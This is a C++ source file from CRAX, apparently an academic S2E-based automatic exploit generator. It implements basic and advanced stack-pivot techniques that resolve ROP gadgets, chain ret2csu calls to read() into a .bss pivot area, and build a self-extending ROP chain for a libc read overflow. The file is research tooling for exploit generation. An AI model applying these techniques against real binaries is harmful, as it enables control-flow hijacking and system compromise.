// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Modules/DynamicRop/DynamicRop.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <cassert>

#include "StackPivot.h"

using namespace klee;

namespace s2e::plugins::crax {

BasicStackPivot::BasicStackPivot()
    : StackPivot() {
    resolveRequiredGadgets();
}


bool BasicStackPivot::checkRequirements() const {
    // XXX: check if ROP gadgets exist.
    return true;
}

void BasicStackPivot::resolveRequiredGadgets() {
    // Gadgets
    g_crax->getExploit().registerSymbol("ret",
            g_crax->getExploit().resolveGadget("ret"));

    g_crax->getExploit().registerSymbol("pop_rbp_ret",
            g_crax->getExploit().resolveGadget("pop rbp ; ret"));

    g_crax->getExploit().registerSymbol("leave_ret",
            g_crax->getExploit().resolveGadget("leave ; ret"));

    // Memory locations
    g_crax->getExploit().registerSymbol("pivot_dest",
            g_crax->getExploit().getElf().bss() + 0x800);
}


std::vector<RopSubchain> BasicStackPivot::getRopSubchains() const {
    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::s_mapper["Ret2csu"]);
    assert(ret2csu);

    // RBP
    RopSubchain part1 = {
        ConstantExpr::create(0, Expr::Int64)};

    // Write the 2nd stage ROP payload via read() to `pivot_dest`
    // via ret2csu(read, 0, pivot_dest, 1024).
    RopSubchain part2 = ret2csu->getRopSubchains(
        BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
        ConstantExpr::create(0, Expr::Int64),
        BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
        ConstantExpr::create(1024, Expr::Int64))[0];

    // Perform stack pivoting.
    RopSubchain part3 = {
        BaseOffsetExpr::create(g_crax->getExploit(), "", "pop_rbp_ret"),
        BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
        BaseOffsetExpr::create(g_crax->getExploit(), "", "leave_ret")};

    RopSubchain ret;
    ret.reserve(part1.size() + part2.size() + part3.size());
    ret.insert(ret.end(), part1.begin(), part1.end());
    ret.insert(ret.end(), part2.begin(), part2.end());
    ret.insert(ret.end(), part3.begin(), part3.end());
    return { ret };
}

RopSubchain BasicStackPivot::getExtraRopSubchain() const {
    return { ConstantExpr::create(0, Expr::Int64) };  // rbp
}



AdvancedStackPivot::AdvancedStackPivot()
    : StackPivot(),
      m_offsetToRetAddr(),
      m_readCallSites() {
    resolveRequiredGadgets();

    g_crax->beforeInstruction.connect(
            sigc::mem_fun(*this, &AdvancedStackPivot::maybeInterceptReadCallSites));

    g_crax->beforeExploitGeneration.connect(
            sigc::mem_fun(*this, &AdvancedStackPivot::beforeExploitGeneration));
}


void AdvancedStackPivot::initialize() {
    // XXX: This is gross, refactor this shit... :(
    static bool initialized = false;

    if (initialized) {
        return;
    }

    initialized = true;
    auto __dynRop = dynamic_cast<DynamicRop *>(g_crax->getModule("DynamicRop"));
    assert(__dynRop && "AdvancedStackPivot relies on DynamicRop module");
    auto &dynRop = *__dynRop;

    // Resolve ret2LeaRbp.
    // XXX: from balsn: this is a good research topic.
    const auto &readCallSiteInfo = *m_readCallSites.rbegin();
    int rbpOffset = 0;
    uint64_t ret2LeaRbp = determineRetAddr(readCallSiteInfo.address, rbpOffset);
    uint64_t pivotDest = g_crax->getExploit().getSymbolValue("pivot_dest");

    ref<Expr> rbp1 = ConstantExpr::create(pivotDest, Expr::Int64);
    ref<Expr> rip1 = ConstantExpr::create(ret2LeaRbp, Expr::Int64);

    dynRop.addConstraint(DynamicRop::RegisterConstraint { Register::X64::RBP, rbp1 })
        .addConstraint(DynamicRop::RegisterConstraint { Register::X64::RIP, rip1 })
        .scheduleConstraints();

    ref<Expr> rbp2 = ConstantExpr::create(pivotDest + 8 + rbpOffset, Expr::Int64);
    ref<Expr> rip2 = ConstantExpr::create(ret2LeaRbp, Expr::Int64);

    dynRop.addConstraint(DynamicRop::RegisterConstraint { Register::X64::RBP, rbp2 })
        .addConstraint(DynamicRop::RegisterConstraint { Register::X64::RIP, rip2 })
        .scheduleConstraints();

    // For debugging convenience, you may uncomment the following line :^)
    //g_crax->setShowInstructions(true);

    // At this point, the exploit generator is already running.
    // This is our last chance to stop it. This method will throw a
    // CpuExitException() and force S2E to re-execute at the PC we specified,
    // allowing us to perform Dynamic ROP.
    dynRop.applyNextConstraint();
}

bool AdvancedStackPivot::checkRequirements() const {
    const auto &sym = g_crax->getExploit().getElf().symbols();
    return sym.find("read") != sym.end() && m_readCallSites.size();
}

void AdvancedStackPivot::resolveRequiredGadgets() {
    // Gadgets
    g_crax->getExploit().registerSymbol("pop_rsi_r15_ret",
            g_crax->getExploit().resolveGadget("pop rsi ; pop r15 ; ret"));

    // Memory locations
    g_crax->getExploit().registerSymbol("pivot_dest",
            g_crax->getExploit().getElf().bss() + 0x800);
}


std::vector<RopSubchain> AdvancedStackPivot::getRopSubchains() const {
    assert(m_readCallSites.size() &&
           "AdvancedStackPivot requires at least one call site of read@libc");

    auto *ret2csu = dynamic_cast<Ret2csu *>(g_crax->getTechnique("Ret2csu"));
    assert(ret2csu && "Ret2csu object not found");

    // At this point, a stack-buffer overflow should take place inside libc,
    // and the weird machine shall not return from read@libc. Now we will
    // be able to perform ROP, but we don't have enough space to perform
    // a huge read() via ret2csu. So here we'll build a self-extending ROP chain
    // which continuously calls read@plt until there's enough space to perform
    // ret2csu once.
    RopSubchain part1;
    for (size_t i = 0; i < 6; i++) {
        ref<Expr> e0 = BaseOffsetExpr::create(g_crax->getExploit(), "", "pop_rsi_r15_ret");
        ref<Expr> e1 = AddExpr::alloc(
                BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
                AddExpr::alloc(
                        ConstantExpr::create(8, Expr::Int64),
                        MulExpr::alloc(
                                ConstantExpr::create(0x30, Expr::Int64),
                                ConstantExpr::create(i + 1, Expr::Int64))));
        ref<Expr> e2 = ConstantExpr::create(0, Expr::Int64);
        ref<Expr> e3 = BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read");

        part1.push_back(e0);
        part1.push_back(e1);
        part1.push_back(e2);
        part1.push_back(e3);
    }

    // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
    // read(0, pivot_dest + 0x30 * 7, 0x400).
    RopSubchain part2 = ret2csu->getRopSubchains(
            BaseOffsetExpr::create(g_crax->getExploit(), "sym", "read"),
            ConstantExpr::create(0, Expr::Int64),
            AddExpr::alloc(
                    BaseOffsetExpr::create(g_crax->getExploit(), "", "pivot_dest"),
                    MulExpr::alloc(
                            ConstantExpr::create(0x30, Expr::Int64),
                            ConstantExpr::create(7, Expr::Int64))),
            ConstantExpr::create(0x400, Expr::Int64))[0];

    while (part2.size() % 6) {
        part2.push_back(ConstantExpr::create(0, Expr::Int64));
    }


    std::vector<RopSubchain> ret;

    // Symbolic ROP subchain
    // We're exploiting the overflow in libc's sys_read(),
    // so constraint solver isn't needed.
    ret.push_back({});

    // Direct ROP subchain
    for (size_t i = 0; i < part1.size(); i += 6) {
        ret.push_back(RopSubchain(part1.begin() + i, part1.begin() + i + 6));
    }
    for (size_t i = 0; i < part2.size(); i += 6) {
        ret.push_back(RopSubchain(part2.begin() + i, part2.begin() + i + 6));
    }

    return ret;
}


void AdvancedStackPivot::maybeInterceptReadCallSites(S2EExecutionState *state,
                                                     const Instruction &i) {
    if (g_crax->isCallSiteOf(i.address, "read")) {
        uint64_t buf = reg().readConcrete(Register::X64::RSI);
        uint64_t len = reg().readConcrete(Register::X64::RDX);
        m_readCallSites.insert({i.address, buf, len});
    }
}

void AdvancedStackPivot::beforeExploitGeneration(S2EExecutionState *state) {
    const auto &readCallSiteInfo = *m_readCallSites.rbegin();
    uint64_t rsp = reg().readConcrete(Register::X64::RSP);
    m_offsetToRetAddr = rsp - readCallSiteInfo.buf - 16;
}

uint64_t AdvancedStackPivot::determineRetAddr(uint64_t readCallSiteAddr,
                                              int &rbpOffset) const {
    std::string symbol = g_crax->getBelongingSymbol(readCallSiteAddr);
    log<WARN>() << hexval(readCallSiteAddr) << " is within " << symbol << "\n";

    std::vector<Instruction> insns = disas().disasm(symbol);
    uint64_t ret = 0;

    // Look for any instruction like lea rax, [rbp - 0x20]
    // If we can find one, return the instruction's offset
    // (relative to ELF base), and copy 0x20 into the `rbpOffset` argument.
    for (int i = insns.size() - 2; i >= 0; i--) {
        static const std::string keyword = "[rbp - ";
        const std::string &target = insns[i].opStr;
        size_t j = 0;

        if (target.back() != ']') {
            continue;
        }

        j = target.find(keyword);
        if (j == std::string::npos) {
            continue;
        }

        std::string strOffset = target.substr(j + keyword.size());
        strOffset.pop_back();  // remove the trailing ']'

        ret = insns[i].address;
        rbpOffset = std::stoi(strOffset, nullptr, 16);
        break;
    }

    assert(ret && "determineReturnAddr(): no suitable candidates?");
    return ret - g_crax->getExploit().getElf().getBase();
}

}  // namespace s2e::plugins::crax
